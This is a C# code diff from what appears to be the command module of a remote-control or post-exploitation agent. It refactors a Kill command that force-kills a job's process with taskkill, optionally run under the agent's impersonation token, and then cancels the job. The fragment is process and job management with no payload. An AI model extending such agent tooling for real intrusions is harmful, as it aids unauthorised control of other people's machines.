@@ -42,39 +42,41 @@ namespace Agent.Commands
 
         protected void Kill(AgentTask task, AgentCommandContext context)
         {
-            if (!task.HasParameter(ParameterId.Id))
-            {
-                context.Error($"Id is mandatory!");
-                return;
-            }
+            task.ThrowIfParameterMissing(ParameterId.Id);
 
             int id = task.GetParameter<int>(ParameterId.Id);
-            var job = this.Service.GetJobById(id);
+            var job = this.Service.GetJob(id);
             if(job == null)
             {
                 context.Error($"Job {id} not found!");
                 return;
             }
 
-            var cmd = $@"c:\windows\system32\cmd.exe /c taskkill /F /T /PID {job.ProcessId}";
-
-            var creationParms = new ProcessCreationParameters()
+            if (job.ProcessId.HasValue)
             {
-                Command = cmd,
-                RedirectOutput = true,
-                CreateNoWindow = true,
-                CurrentDirectory = Environment.CurrentDirectory
-            };
+
+                var cmd = $@"c:\windows\system32\cmd.exe /c taskkill /F /T /PID {job.ProcessId}";
+
+                var creationParms = new ProcessCreationParameters()
+                {
+                    Command = cmd,
+                    RedirectOutput = true,
+                    CreateNoWindow = true,
+                    CurrentDirectory = Environment.CurrentDirectory
+                };
 
 
-            if (context.Agent.ImpersonationToken != IntPtr.Zero)
-                creationParms.Token = context.Agent.ImpersonationToken;
+                if (context.Agent.ImpersonationToken != IntPtr.Zero)
+                    creationParms.Token = context.Agent.ImpersonationToken;
 
-            var procResult = APIWrapper.CreateProcess(creationParms);
+                var procResult = APIWrapper.CreateProcess(creationParms);
 
-            if (creationParms.RedirectOutput)
-                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                if (creationParms.RedirectOutput)
+                    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => context.AppendResult(output, false));
+            }
 
+            if(job.CancellationToken != null)
+                job.CancellationToken.Cancel();
 
             return;
         }
